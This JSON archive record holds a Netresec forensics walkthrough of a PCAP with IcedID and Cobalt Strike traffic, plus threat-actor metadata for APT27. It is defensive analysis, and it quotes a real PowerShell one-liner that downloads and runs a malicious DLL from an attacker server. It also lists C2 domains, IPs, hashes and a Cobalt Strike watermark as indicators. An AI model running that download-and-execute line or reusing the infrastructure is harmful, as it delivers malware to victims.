{
    "id": "e70a5947-8c3a-409d-9c06-aa8595450bb6",
    "created_at": "2023-01-12T15:07:47.72277Z",
    "updated_at": "2025-03-27T02:15:45.355804Z",
    "deleted_at": null,
    "sha1_hash": "431451747cdd5799ae04698559d1684613ff73b0",
    "title": "2021-04-19 - Analysing a malware PCAP with IcedID and Cobalt Strike traffic",
    "authors": "",
    "file_creation_date": "2022-05-28T02:39:22Z",
    "file_modification_date": "2022-05-28T02:39:22Z",
    "file_size": 282165,
    "plain_text": "# Analysing a malware PCAP with IcedID and Cobalt Strike traffic\n\n**netresec.com/**\n\nApril 19, 2021\n\nErik Hjelmvik\n\n,\n\nMonday, 19 April 2021 09:45:00 (UTC/GMT)\n\n[This network forensics walkthrough is based on two pcap files released by Brad Duncan on](https://twitter.com/malware_traffic)\n[malware-traffic-analysis.net. The traffic was generated by executing a malicious JS file called](https://www.malware-traffic-analysis.net/2021/04/12/index2.html)\n[StolenImages_Evidence.js in a sandbox environment.](https://www.virustotal.com/gui/file/0314b8cd45b636f38d07032dc8ed463295710460ea7a4e214c1de7b0e817aab6/details)\n\nThe capture file starts with a DNS lookup for banusdona.top, which resolved to\n172.67.188.12, followed by an HTTP GET request for \"/222g100/index.php\" on that domain.\nThe following PowerShell oneliner is returned in the HTTP response from banusdona.top:\n\n$path = $Env:temp+'\\JwWdx.dat'; $client = New-Object Net.WebClient;\n$client.downloadfile('http://banusdona.top/222g100/main.php',$path);\nC:\\Windows\\System32\\rundll32.exe $path,DllRegisterServer\n\nThis oneliner instructs the initial dropper to download a Win32 DLL payload from\nhttp://banusdona[.]top/222g100/main.php and save it as \"JwWdx.dat\" in the user's temp\ndirectory and then run the DLL with:\n\nrundll32.exe %TEMP%\\JwWdx.dat,DllRegisterServer\n\nAs you can see in the screenshot below, the HTTP response for this second request to\nbanusdona.top has Content-Type \"application/octet-stream\", but also a conflicting Contentdisposition header of \"attachment;filename=data.jpg\", which indicates that the file should be\n\n\n-----\n\nsaved to disk as data.jpg . Nevertheless, the MZ header in the transferred data reveals\nthat the downloaded data wasn't an image, but a Windows binary (dll or exe).\n\nImage: [CapLoader](https://www.netresec.com/?page=CapLoader)\n\ntranscript of IcedID malware download\n[The downloaded file gets extracted from the pcap file by NetworkMiner as \"data.jpg.octet-](https://www.netresec.com/?page=Networkminer)\nstream\".\n\n\n-----\n\nImage: Files\n\nextracted from PCAP by [NetworkMiner](https://www.netresec.com//?page=Networkminer)\nRight-clicking \"data.jpg.octet-stream\" in NetworkMiner and selecting \"Calculate MD5...\"\nbrings up a new window with additional file details, such as MD5 and SHA hashes of the\nreassembled file.\n\nMD5: f98711dfeeab9c8b4975b2f9a88d8fea SHA1:\nc2bdc885083696b877ab6f0e05a9d968fd7cc2bb SHA256:\n213e9c8bf7f6d0113193f785cb407f0e8900ba75b9131475796445c11f3ff37c\n\nThis file is [available on VirusTotal, where we can see that it's a DLL that several AV vendors](https://www.virustotal.com/gui/file/213e9c8bf7f6d0113193f785cb407f0e8900ba75b9131475796445c11f3ff37c/detection)\nidentify as \"Cerbu\" or \"IcedID\". VirusTotal's [C2AE sandbox analysis of the DLL also reveals](https://www.virustotal.com/gui/file/213e9c8bf7f6d0113193f785cb407f0e8900ba75b9131475796445c11f3ff37c/behavior)\nthe domain name \"momenturede.fun\" in the process' memory. As you might expect, a\nconnection is made to that domain just a few seconds later. A nice overview of these\n[connections can be seen in CapLoader's Flow tab.](https://www.netresec.com/?page=CapLoader)\n\n\n-----\n\nImage: CapLoader\n\nshowing initial flows from the IcedID malware execution\nThe momenturede.fun server returns a 500kB file, which NetworkMiner extracts from the\npcap file as \"index.gzip\".\n\nMD5: 96a535122aba4240e2c6370d0c9a09d3 SHA1:\n485ba347cf898e34a7455e0fd36b0bcf8b03ffd8 SHA256:\n3d1b525ec2ee887bbc387654f6ff6d88e41540b789ea124ce51fb5565e2b8830\n\n[This turns out to be an encrypted IcedID DLL file, which has been analyzed by Ali Aqeel](https://twitter.com/aaqeel87)\nhere:\n[https://aaqeel01.wordpress.com/2021/04/09/icedid-analysis/](https://aaqeel01.wordpress.com/2021/04/09/icedid-analysis/)\n\nRight after the IcedID download we see a series of HTTPS connections towards odd\ndomains like vaccnavalcod.website, mazzappa.fun, ameripermanentno.website and\nodichaly.space, all of which resolved to IP 83.97.20.176. That host is most likely a commandand-control (C2) server used by the IcedID malware.\n\nCapLoader's \"Services\" tab also reveals that the TLS connections to port 443 on\n83.97.20.176 are very periodic, with a new connection every 5 minutes. Periodic connection\npatterns like this is a typical indicator of C2 traffic where the malware agent connects back to\n\n\n-----\n\nthe C2 server on regular intervals to check for new tasks.\n\nImage:\n\nCapLoader's Services tab showing that the IcedID malware agent connects to the C2 server\nevery 5 minutes (00:05:01).\nThe traffic to 83.97.20.176 is encrypted, so we can't inspect the payload to verify whether or\nnot it is IcedID C2 communications. What we can do, however, is to extract the HTTPS\nserver's X.509 certificate and the JA3 hash of the client's TLS implementation from the\nencrypted traffic.\n\nNetworkMiner has extracted the X.509 certificates for vaccnavalcod.website, mazzappa.fun,\nameripermanentno.website and odichaly.space to disk as \"localhost.cer\".\n\n\n-----\n\nIt turns out that all these sites used the same self-signed certificate, which had SHA1\nfingerprint 452e969c51882628dac65e38aff0f8e5ebee6e6b. The X.509 certificate was\ncreated using OpenSSL's default values, such as \"Internet Widgits Pty Ltd\" etc. Further\n[details about this certificate can be found on censys.io.](https://censys.io/certificates/3aa3c04a44374da9b665760abca20bd3722b02629f6b506802c0cd6dedf75f77)\n\nThe JA3 hashes used by the IcedID malware agent can be found in NetworkMiner's Hosts\ntab as well as in the Parameters tab.\n\n\n-----\n\nImage:\n\nNetworkMiner's Parameters tab with keyword filter \"JA3 Hash\"\nThe JA3 hashes for the client that connects to the C2 server are\na0e9f5d64349fb13191bc781f81f42e1 and 3b5074b1b5d032e5620f69f9f700ff0e. Several\nlegitimate Windows applications unfortunately have the same JA3 hashes, so we can't use\nthem to uniquely identify the IcedID agents.\n\nThe IcedID C2 traffic continues for over 19 hours, at which point we suddenly see a\nconnection to a new suspicious domain called \"lesti.net\" on 185.141.26.140. The first HTTP\nrequest to that domain is used to download a 261703 byte file, as can be seen in this Flow\nTranscript from CapLoader:\n\n\n-----\n\nNetworkMiner extracts this file as \"9r8z.octet-stream\". This turns out to be a Cobalt Strike\nbeacon download, which we can decode with Didier Stevens' fantastic [1768.py script.](https://blog.didierstevens.com/2020/11/07/1768-k/)\n\nThe output from 1768.py reveals that this Cobalt Strike beacon is using the following URIs\nfor C2 communication:\n\nGET URI: http://lesti[.]net/userid=\nPOST URI: http://lesti[.]net/update.php\n\nWe can also see that the Cobalt Strike license-id (a.k.a. watermark) is 1580103814. This ID\ncan be used to link this Cobalt Strike beacon to other campaigns. Below is a list of Cobalt\n[Strike C2 servers using license-id 1580103814 discovered by Tek in December 2020:](https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/)\n\n45.147.229[.]157\nselfspin[.]com\nsavann[.]org\npalside[.]com\nserver3.msadwindows[.]com\nmapizzamates[.]com\nfixval[.]com\nrackspare-technology[.]download\n108.177.235[.]148\nmatesmapizza[.]com\n\n**Update 4 May 2021**\n\n\n-----\n\n[Sergiu Sechel published a blog post yesterday, which included a list of Cobalt Strike C2](https://twitter.com/SergiuSechel)\nservers. We fed this list to [Tek's](https://twitter.com/tenacioustek) [scan_list.py script in order to see if license-id 1580103814 is](https://github.com/Te-k/cobaltstrike)\nstill active. It turned out it was. We found the following 27 domains and IP's running Cobalt\nStrike C2 servers on TCP 443 using that license-id.\n\n151.236.14[.]53\n151.236.14[.]53\n172.241.27[.]70\n193.29.13[.]201\n193.29.13[.]201\n193.29.13[.]209\n194.165.16[.]60\n193.29.13[.]209\n193.29.13[.]201\n194.165.16[.]60\n194.165.16[.]60\ndain22[.]net\ndrellio[.]com\nfeusa[.]net\nfut1[.]net\nhelle1[.]net\nhars2t[.]com\nkasaa[.]net\nidxup[.]com\nmaren2[.]com\nmgfee[.]com\nmassflip[.]com\noaelf[.]com\nrepdot[.]com\nscalewa[.]com\ntulls[.]net\nwellser[.]org\n\n[The full output from our re-scan of Sergiu's C2 list can be found on pastebin.](https://pastebin.com/RqFnRzKe)\n\n**Update 8 May 2021**\n\n[Security researcher Michael Koczwara is tracking Cobalt Strike license 1580103814 as APT](https://twitter.com/MichalKoczwara)\n[actor LuckyMouse (a.k.a. Emissary Panda or APT 27). Michael's Cobalt Stike C2 dataset,](https://malpedia.caad.fkie.fraunhofer.de/actor/emissary_panda)\nwhich currently contains 25 unique C2 IPs and domains for license-id 1580103814, is\n[available as a Google Docs spreadsheet (see the \"LuckyMouse Actor\" tab).](https://docs.google.com/spreadsheets/d/1bYvBh6NkNYGstfQWnT5n7cSxdhjSn1mduX8cziWSGrw/edit#gid=1146726072)\n\n**Indicators of Compromise - IOCs**\n\n\n-----\n\nMD5: 8da75e1f974d1011c91ed3110a4ded38\nSHA1: e9b5e549363fa9fcb362b606b75d131dec6c020e\nSHA256:\n0314b8cd45b636f38d07032dc8ed463295710460ea7a4e214c1de7b0e817aab6\nDNS: banusdona.top\nIP: 172.67.188.12\nMD5: f98711dfeeab9c8b4975b2f9a88d8fea\nSHA1: c2bdc885083696b877ab6f0e05a9d968fd7cc2bb\nSHA256: 213e9c8bf7f6d0113193f785cb407f0e8900ba75b9131475796445c11f3ff37c\nDNS: momenturede.fun\nIP: 104.236.115.181\nMD5: 96a535122aba4240e2c6370d0c9a09d3\nSHA1: 485ba347cf898e34a7455e0fd36b0bcf8b03ffd8\nMD5: 11965662e146d97d3fa3288e119aefb2\nSHA1: b63d7ad26df026f6cca07eae14bb10a0ddb77f41\nSHA256: d45b3f9d93171c29a51f9c8011cd61aa44fcb474d59a0b68181bb690dbbf2ef5\nDNS: vaccnavalcod.website\nDNS: mazzappa.fun\nDNS: ameripermanentno.website\nDNS: odichaly.space\nIP: 83.97.20.176\nSHA1: 452e969c51882628dac65e38aff0f8e5ebee6e6b\nDNS: lesti.net\nIP: 185.141.26.140\nMD5: 449c1967d1708d7056053bedb9e45781\nSHA1: 1ab39f1c8fb3f2af47b877cafda4ee09374d7bd3\nSHA256:\nc7da494880130cdb52bd75dae1556a78f2298a8cc9a2e75ece8a57ca290880d3\nCobalt Strike Watermark: 1580103814\n\n**Network Forensics Training**\n\nAre you interested in learning more about how to analyze captured network traffic from\n[malware and hackers? Have a look at our network forensic trainings. Our next class is a live](https://www.netresec.com/?page=Training)\n[online event called PCAP in the Morning.](https://netresec.com/?b=21300ef)\n\nPosted by Erik Hjelmvik on Monday, 19 April 2021 09:45:00 (UTC/GMT)\n\n[Tags: #Cobalt Strike #CobaltStrike #NetworkMiner #CapLoader #Network Forensics #JA3](https://netresec.com/?page=Blog&tag=Cobalt%20Strike)\n[#X.509 #1768.py](https://netresec.com/?page=Blog&tag=X.509)\n\n## Recent Posts\n\n» [Real-time PCAP-over-IP in Wireshark](https://netresec.com/?page=Blog&month=2022-05&post=Real-time-PCAP-over-IP-in-Wireshark)\n\n\n-----\n\n» [Emotet C2 and Spam Traffic Video](https://netresec.com/?page=Blog&month=2022-05&post=Emotet-C2-and-Spam-Traffic-Video)\n\n» [Industroyer2 IEC-104 Analysis](https://netresec.com/?page=Blog&month=2022-04&post=Industroyer2-IEC-104-Analysis)\n\n» [NetworkMiner 2.7.3 Released](https://netresec.com/?page=Blog&month=2022-04&post=NetworkMiner-2-7-3-Released)\n\n» [PolarProxy in Windows Sandbox](https://netresec.com/?page=Blog&month=2022-01&post=PolarProxy-in-Windows-Sandbox)\n\n» [PolarProxy 0.9 Released](https://netresec.com/?page=Blog&month=2022-01&post=PolarProxy-0-9-Released)\n\n## Blog Archive\n\n» [2022 Blog Posts](https://netresec.com/?page=Blog&year=2022)\n\n» [2021 Blog Posts](https://netresec.com/?page=Blog&year=2021)\n\n» [2020 Blog Posts](https://netresec.com/?page=Blog&year=2020)\n\n» [2019 Blog Posts](https://netresec.com/?page=Blog&year=2019)\n\n» [2018 Blog Posts](https://netresec.com/?page=Blog&year=2018)\n\n» [2017 Blog Posts](https://netresec.com/?page=Blog&year=2017)\n\n» [2016 Blog Posts](https://netresec.com/?page=Blog&year=2016)\n\n» [2015 Blog Posts](https://netresec.com/?page=Blog&year=2015)\n\n» [2014 Blog Posts](https://netresec.com/?page=Blog&year=2014)\n\n» [2013 Blog Posts](https://netresec.com/?page=Blog&year=2013)\n\n» [2012 Blog Posts](https://netresec.com/?page=Blog&year=2012)\n\n» [2011 Blog Posts](https://netresec.com/?page=Blog&year=2011)\n\n[List all blog posts](https://netresec.com/?page=Blog&blogPostList=true)\n\n## NETRESEC on Twitter\n\nFollow [@netresec on twitter:](http://twitter.com/netresec)\n\n» [twitter.com/netresec](http://twitter.com/netresec)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-19 - Analysing a malware PCAP with IcedID and Cobalt Strike traffic.pdf"
    ],
    "report_names": [
        "2021-04-19 - Analysing a malware PCAP with IcedID and Cobalt Strike traffic.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3492534-85a6-4c87-a754-5ae4a56d7c8c",
            "created_at": "2022-10-25T15:50:23.819113Z",
            "updated_at": "2025-03-27T02:00:55.552554Z",
            "deleted_at": null,
            "main_name": "Threat Group-3390",
            "aliases": [
                "Threat Group-3390",
                "Earth Smilodon",
                "TG-3390",
                "Emissary Panda",
                "BRONZE UNION",
                "APT27",
                "Iron Tiger",
                "LuckyMouse"
            ],
            "source_name": "MITRE:Threat Group-3390",
            "tools": [
                "Systeminfo",
                "gsecdump",
                "PlugX",
                "ASPXSpy",
                "Cobalt Strike",
                "Mimikatz",
                "Impacket",
                "gh0st RAT",
                "certutil",
                "China Chopper",
                "HTTPBrowser",
                "Tasklist",
                "netstat",
                "SysUpdate",
                "HyperBro",
                "ZxShell",
                "RCSession",
                "ipconfig",
                "Clambling",
                "pwdump",
                "NBTscan",
                "Pandora",
                "Windows Credential Editor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2c980ea7-04c4-4193-8535-52f87e66a96e",
            "created_at": "2024-05-01T02:03:07.994126Z",
            "updated_at": "2025-03-27T02:05:17.293799Z",
            "deleted_at": null,
            "main_name": "BRONZE UNION",
            "aliases": [
                "Budworm ",
                "Emissary Panda ",
                "Iron Tiger ",
                "Lucky Mouse ",
                "TG-3390 ",
                "Temp.Hippo ",
                "APT27 "
            ],
            "source_name": "Secureworks:BRONZE UNION",
            "tools": [
                " ASPXSpy",
                " China Chopper",
                " Enfal",
                " Gh0st RAT",
                " HttpBrowser",
                " Hunter",
                " HyperBro",
                " OwaAuth",
                " PlugX",
                " PoisonIvy",
                " Sysupdate",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c63ab035-f9f2-4723-959b-97a7b98b5942",
            "created_at": "2023-01-06T13:46:38.298354Z",
            "updated_at": "2025-03-27T02:00:02.798255Z",
            "deleted_at": null,
            "main_name": "APT27",
            "aliases": [
                "TG-3390",
                "EMISSARY PANDA",
                "TEMP.Hippo",
                "Budworm",
                "Group 35",
                "BRONZE UNION",
                "Lucky Mouse",
                "Iron Taurus",
                "GreedyTaotie",
                "Red Phoenix",
                "ZipToken",
                "Iron Tiger",
                "G0027",
                "Earth Smilodon"
            ],
            "source_name": "MISPGALAXY:APT27",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5c13338b-eaed-429a-9437-f5015aa98276",
            "created_at": "2022-10-25T16:07:23.582715Z",
            "updated_at": "2025-03-27T02:02:09.875151Z",
            "deleted_at": null,
            "main_name": "Emissary Panda",
            "aliases": [
                "APT 27",
                "ATK 15",
                "Bronze Union",
                "Budworm",
                "Earth Smilodon",
                "Emissary Panda",
                "Group 35",
                "Iron Taurus",
                "Iron Tiger",
                "LuckyMouse",
                "Operation DRBControl",
                "Operation Iron Tiger",
                "Operation PZChao",
                "Operation SpoiledLegacy",
                "Operation StealthyTrident",
                "Red Phoenix",
                "TEMP.Hippo",
                "TG-3390",
                "ZipToken"
            ],
            "source_name": "ETDA:Emissary Panda",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Agent.dhwf",
                "AngryRebel",
                "Antak",
                "CHINACHOPPER",
                "China Chopper",
                "Destroy RAT",
                "DestroyRAT",
                "FOCUSFJORD",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HTTPBrowser",
                "HTran",
                "HUC Packet Transmit Tool",
                "HighShell",
                "HttpBrowser RAT",
                "HttpDump",
                "HyperBro",
                "HyperSSL",
                "HyperShell",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "Nishang",
                "OwaAuth",
                "PCRat",
                "PlugX",
                "ProcDump",
                "PsExec",
                "RedDelta",
                "SEASHARPEE",
                "Sensocode",
                "SinoChopper",
                "Sogu",
                "SysUpdate",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Token Control",
                "TokenControl",
                "TwoFace",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Xamtrav",
                "ZXShell",
                "gsecdump",
                "luckyowa"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536067,
    "ts_updated_at": 1743041745,
    "ts_creation_date": 1653705562,
    "ts_modification_date": 1653705562,
    "files": {
        "pdf": "https://archive.orkl.eu/431451747cdd5799ae04698559d1684613ff73b0.pdf",
        "text": "https://archive.orkl.eu/431451747cdd5799ae04698559d1684613ff73b0.txt",
        "img": "https://archive.orkl.eu/431451747cdd5799ae04698559d1684613ff73b0.jpg"
    }
}